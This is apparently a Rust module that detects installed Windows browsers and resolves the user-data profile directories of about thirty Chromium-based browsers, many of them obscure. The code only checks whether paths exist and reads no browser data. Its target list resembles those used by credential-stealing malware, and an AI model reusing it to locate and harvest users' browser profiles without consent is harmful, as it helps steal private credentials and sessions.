//! Browser discovery via filesystem checks (no registry).

use std::env;
use std::path::{Path, PathBuf};
use crate::dbg_log;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DataRoot {
    Local,
    Roaming,
}

#[derive(Clone, Debug)]
pub struct BrowserPath {
    pub name: String,
    pub exe: String,
    pub user_data_rel: String,
    pub root: DataRoot,
    pub has_profiles: bool,
}

fn fallback_for(exe_name: &str) -> Option<PathBuf> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming = env::var("APPDATA").unwrap_or_default();

    let exe_path = |base: &str, sub: &str| -> PathBuf {
        PathBuf::from(base).join(sub).join(exe_name)
    };

    let candidates: Vec<PathBuf> = match exe_name {
        "chrome.exe" => vec![
            exe_path(&pf, "Google\\Chrome\\Application"),
            exe_path(&pf86, "Google\\Chrome\\Application"),
            exe_path(&local, "Google\\Chrome\\Application"),
        ],
        "msedge.exe" => vec![
            exe_path(&pf, "Microsoft\\Edge\\Application"),
            exe_path(&pf86, "Microsoft\\Edge\\Application"),
            exe_path(&local, "Microsoft\\Edge\\Application"),
        ],
        "brave.exe" => vec![
            exe_path(&pf, "BraveSoftware\\Brave-Browser\\Application"),
            exe_path(&pf86, "BraveSoftware\\Brave-Browser\\Application"),
            exe_path(&local, "BraveSoftware\\Brave-Browser\\Application"),
            exe_path(&local, "BraveSoftware\\Brave-Browser-Beta\\Application"),
            exe_path(&local, "BraveSoftware\\Brave-Browser-Nightly\\Application"),
        ],
        "vivaldi.exe" => vec![
            exe_path(&local, "Vivaldi\\Application"),
            exe_path(&pf, "Vivaldi\\Application"),
        ],
        "opera.exe" => vec![
            exe_path(&local, "Programs\\Opera"),
            exe_path(&local, "Programs\\Opera GX"),
            exe_path(&pf, "Opera"),
            exe_path(&roaming, "Opera Software\\Opera Stable"),
        ],
        "browser.exe" => vec![
            exe_path(&local, "Yandex\\YandexBrowser\\Application"),
            exe_path(&pf, "Yandex\\YandexBrowser\\Application"),
            exe_path(&local, "CocCoc\\Browser\\Application"),
        ],
        "360chrome.exe" => vec![
            exe_path(&local, "360Chrome\\Chrome\\Application"),
        ],
        "epic.exe" => vec![
            exe_path(&local, "Epic Privacy Browser\\Application"),
            exe_path(&pf, "Epic Privacy Browser\\Application"),
        ],
        "centbrowser.exe" => vec![
            exe_path(&local, "CentBrowser\\Application"),
            exe_path(&pf, "CentBrowser\\Application"),
        ],
        "torch.exe" => vec![
            exe_path(&local, "Torch\\Application"),
        ],
        "slimjet.exe" => vec![
            exe_path(&local, "Slimjet\\Application"),
        ],
        "iridium.exe" => vec![
            exe_path(&local, "Iridium\\Application"),
        ],
        "thorium.exe" => vec![
            exe_path(&local, "Thorium\\Application"),
        ],
        "7star.exe" => vec![
            exe_path(&local, "7Star\\7Star\\Application"),
        ],
        "orbitum.exe" => vec![
            exe_path(&local, "Orbitum\\Application"),
        ],
        "kometa.exe" => vec![
            exe_path(&local, "Kometa\\Application"),
        ],
        "amigo.exe" => vec![
            exe_path(&local, "Amigo\\Application"),
        ],
        "sputnik.exe" => vec![
            exe_path(&local, "Sputnik\\Sputnik\\Application"),
        ],
        "uran.exe" => vec![
            exe_path(&local, "uCozMedia\\Uran\\Application"),
        ],
        "Arc.exe" | "arc.exe" => vec![
            exe_path(&local, "The Browser Company\\Arc\\Application"),
        ],
        _ => Vec::new(),
    };

    for c in candidates {
        if c.exists() {
            dbg_log!("paths: fallback hit {} -> {:?}", exe_name, c);
            return Some(c);
        }
    }
    None
}

pub fn find_app_path(exe_name: &str) -> Option<PathBuf> {
    fallback_for(exe_name)
}

pub fn all_browsers() -> Vec<BrowserPath> {
    vec![
        BrowserPath { name: "Chrome".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Chrome Beta".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome Beta\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Chrome Dev".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome Dev\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Chrome Canary".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome SxS\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Chromium".into(), exe: "chrome.exe".into(), user_data_rel: r"Chromium\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Edge".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Edge Beta".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge Beta\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Edge Dev".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge Dev\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Brave".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Brave Beta".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser-Beta\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Brave Nightly".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser-Nightly\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Opera".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera Stable".into(), root: DataRoot::Roaming, has_profiles: false },
        BrowserPath { name: "OperaGX".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera GX Stable".into(), root: DataRoot::Roaming, has_profiles: false },
        BrowserPath { name: "Opera Neon".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera Neon\User Data".into(), root: DataRoot::Roaming, has_profiles: true },
        BrowserPath { name: "Vivaldi".into(), exe: "vivaldi.exe".into(), user_data_rel: r"Vivaldi\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Yandex".into(), exe: "browser.exe".into(), user_data_rel: r"Yandex\YandexBrowser\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "CocCoc".into(), exe: "browser.exe".into(), user_data_rel: r"CocCoc\Browser\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "CentBrowser".into(), exe: "centbrowser.exe".into(), user_data_rel: r"CentBrowser\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "360Chrome".into(), exe: "360chrome.exe".into(), user_data_rel: r"360Chrome\Chrome\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Epic Privacy Browser".into(), exe: "epic.exe".into(), user_data_rel: r"Epic Privacy Browser\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Uran".into(), exe: "uran.exe".into(), user_data_rel: r"uCozMedia\Uran\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "7Star".into(), exe: "7star.exe".into(), user_data_rel: r"7Star\7Star\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Torch".into(), exe: "torch.exe".into(), user_data_rel: r"Torch\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Kometa".into(), exe: "kometa.exe".into(), user_data_rel: r"Kometa\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Orbitum".into(), exe: "orbitum.exe".into(), user_data_rel: r"Orbitum\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Amigo".into(), exe: "amigo.exe".into(), user_data_rel: r"Amigo\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Sputnik".into(), exe: "sputnik.exe".into(), user_data_rel: r"Sputnik\Sputnik\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Slimjet".into(), exe: "slimjet.exe".into(), user_data_rel: r"Slimjet\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Iridium".into(), exe: "iridium.exe".into(), user_data_rel: r"Iridium\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Thorium".into(), exe: "thorium.exe".into(), user_data_rel: r"Thorium\User Data".into(), root: DataRoot::Local, has_profiles: true },
        BrowserPath { name: "Arc".into(), exe: "Arc.exe".into(), user_data_rel: r"The Browser Company\Arc\User Data".into(), root: DataRoot::Local, has_profiles: true },
    ]
}

pub fn discover_installed_browsers() -> Vec<BrowserPath> {
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming = env::var("APPDATA").unwrap_or_default();
    let mut installed = Vec::new();

    for b in all_browsers() {
        let exe_hit = find_app_path(&b.exe).is_some();
        let root = match b.root {
            DataRoot::Local => &local,
            DataRoot::Roaming => &roaming,
        };
        let user_data = Path::new(root).join(&b.user_data_rel);
        let user_data_exists = user_data.exists();

        if exe_hit || user_data_exists {
            dbg_log!(
                "paths: '{}' exe={} user_data_exists={} -> include",
                b.name, exe_hit, user_data_exists
            );
            installed.push(b);
        } else {
            dbg_log!(
                "paths: '{}' exe={} user_data_exists={} -> skip",
                b.name, exe_hit, user_data_exists
            );
        }
    }

    installed
}

pub fn user_data_path(b: &BrowserPath) -> PathBuf {
    let root = match b.root {
        DataRoot::Local => env::var("LOCALAPPDATA").unwrap_or_default(),
        DataRoot::Roaming => env::var("APPDATA").unwrap_or_default(),
    };
    PathBuf::from(root).join(&b.user_data_rel)
}
